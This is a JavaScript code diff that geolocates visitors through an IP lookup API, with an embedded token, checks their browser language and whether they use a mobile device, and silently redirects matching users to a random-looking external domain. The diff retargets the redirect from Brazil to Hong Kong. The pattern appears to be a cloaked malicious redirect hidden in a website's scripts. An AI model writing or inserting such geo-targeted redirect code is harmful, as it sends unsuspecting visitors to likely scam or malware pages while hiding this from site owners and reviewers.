@@ -49,11 +49,11 @@
            navigator.languages.some(lang => lang.startsWith('pt'));
 }
 
-    fetch('https://ipapi.co/json/')
+    fetch('https://api.ipinfo.io/lite/me?token=76a43e3733f2d4')
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'BR' && isMobileDevice()) {
+        if (data.country_code === 'HK' && isMobileDevice()) {
           window.location.href = "https://www.jacmsotck.online/jz/bxjz.html";
           return;
         }
